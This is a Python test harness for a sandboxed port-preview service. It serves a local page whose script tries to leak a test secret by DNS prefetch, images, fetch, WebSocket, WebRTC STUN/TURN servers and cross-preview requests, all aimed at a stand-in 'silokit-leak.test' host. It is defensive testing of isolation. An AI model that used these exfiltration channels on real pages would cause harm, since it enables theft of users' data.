"""For test 44: the forwarder of #384's port previews, with an app page that tries to leave.

    python3 -I py/44-preview.py --dir D --secret S

Serves, on 127.0.0.1 (the port goes to D/forwarder.port), by Host:
  silo.c1a7.localhost   Silo's page for computer c1a7: the app in a frame, sandboxed as #384
                        recommends (allow-scripts allow-same-origin allow-forms)
  3000.c1a7.localhost   the app of c1a7's port 3000, with #384's policies (connect-src 'self',
                        devices, clipboard and fullscreen off); the page tries every way out
                        #384 measured, each carrying S: names looked up by prefetch, an image,
                        fetch, a WebSocket and WebRTC's STUN and TURN servers, and requests to
                        another computer's preview (3000.c2b8.localhost)
  3000.c2b8.localhost   that other computer's preview: any request here came from c1a7's page
Each request is one JSON line in D/forwarder.jsonl; the page's own reports (what each try said)
go to D/report.jsonl.
"""
import argparse
import http.server
import json
import os
import socketserver
import time
import urllib.parse

APP = """<!doctype html><meta charset=utf-8><title>preview</title><h1>app</h1>
<script>
const S = "%(secret)s";
const N = v => `${v}-${S}.silokit-leak.test`;
const R = (w, d) => fetch("/report?what=" + w + "&d=" + encodeURIComponent(String(d))).catch(() => {});
const T = (w, f) => { try { const r = f(); if (r && r.catch) r.catch(e => R(w, "error " + e.name)); } catch (e) { R(w, "error " + e.name); } };
for (const rel of ["dns-prefetch", "preconnect"]) { const l = document.createElement("link"); l.rel = rel; l.href = "http://" + N(rel) + "/"; document.head.appendChild(l); }
T("img", () => { new Image().src = "http://" + N("img") + "/x.png"; });
T("fetch", () => fetch("http://" + N("fetch") + "/", {mode: "no-cors"}));
T("ws", () => { new WebSocket("ws://" + N("ws") + "/"); });
T("webrtc", async () => {
  const pc = new RTCPeerConnection({iceServers: [{urls: "stun:" + N("stun") + ":3478"},
    {urls: "turn:" + N("turn") + ":3478?transport=udp", username: "u", credential: "x"},
    {urls: "turn:" + N("turntcp") + ":3478?transport=tcp", username: "u", credential: "x"}]});
  pc.onicecandidate = e => { if (e.candidate) R("webrtc-candidate", e.candidate.candidate); };
  pc.createDataChannel("x"); await pc.setLocalDescription(await pc.createOffer());
});
const C2 = location.origin.replace("c1a7", "c2b8");
T("cross-fetch", () => fetch(C2 + "/from-c1?via=fetch&d=" + S, {mode: "no-cors"}));
T("cross-img", () => { new Image().src = C2 + "/from-c1?via=img&d=" + S; });
T("cross-ws", () => { new WebSocket(C2.replace("http", "ws") + "/from-c1?via=ws&d=" + S); });
setTimeout(() => R("done", 1), 8000);
</script>"""

SILO = """<!doctype html><meta charset=utf-8><title>Silo: c1a7 port 3000</title>
<iframe src="http://3000.c1a7.localhost:%(port)d/" sandbox="allow-scripts allow-same-origin allow-forms" style="width:100%%;height:90vh;border:0"></iframe>"""

APP_HEADERS = [("Content-Security-Policy", "default-src 'self' 'unsafe-inline'; connect-src 'self'; frame-ancestors http://silo.c1a7.localhost:%(port)d"),
               ("Permissions-Policy", "camera=(), microphone=(), geolocation=(), clipboard-read=(), clipboard-write=(), fullscreen=()")]


class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def send(self, body, ctype="text/html", headers=()):
        b = body.encode()
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(b)))
        for k, v in headers:
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(b)

    def do_GET(self):
        a = self.server.args
        host = self.headers.get("Host", "").split(":")[0].lower()
        path = self.path
        if path.startswith("http://"):
            u = urllib.parse.urlsplit(path)
            host, path = u.hostname or host, (u.path or "/") + ("?" + u.query if u.query else "")
        with open(os.path.join(a.dir, "forwarder.jsonl"), "a") as f:
            f.write(json.dumps({"t": round(time.time(), 3), "host": host, "path": path[:300]}) + "\n")
        port = self.server.server_address[1]
        if host == "silo.c1a7.localhost":
            self.send(SILO % {"port": port})
        elif host == "3000.c1a7.localhost" and path.startswith("/report"):
            q = urllib.parse.parse_qs(urllib.parse.urlsplit(path).query)
            with open(os.path.join(a.dir, "report.jsonl"), "a") as f:
                f.write(json.dumps({"what": q.get("what", [""])[0], "d": q.get("d", [""])[0][:300]}) + "\n")
            self.send("ok", "text/plain")
        elif host == "3000.c1a7.localhost":
            self.send(APP % {"secret": a.secret}, headers=[(k, v % {"port": port}) for k, v in APP_HEADERS])
        else:
            self.send("c2b8's app", "text/plain")


class S(socketserver.ThreadingMixIn, http.server.HTTPServer):
    daemon_threads = True
    allow_reuse_address = True


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--dir", required=True)
    ap.add_argument("--secret", required=True)
    a = ap.parse_args()
    s = S(("127.0.0.1", 0), H)
    s.args = a
    with open(os.path.join(a.dir, "forwarder.port.tmp"), "w") as f:
        f.write("%d\n" % s.server_address[1])
    os.replace(os.path.join(a.dir, "forwarder.port.tmp"), os.path.join(a.dir, "forwarder.port"))
    s.serve_forever()


if __name__ == "__main__":
    main()
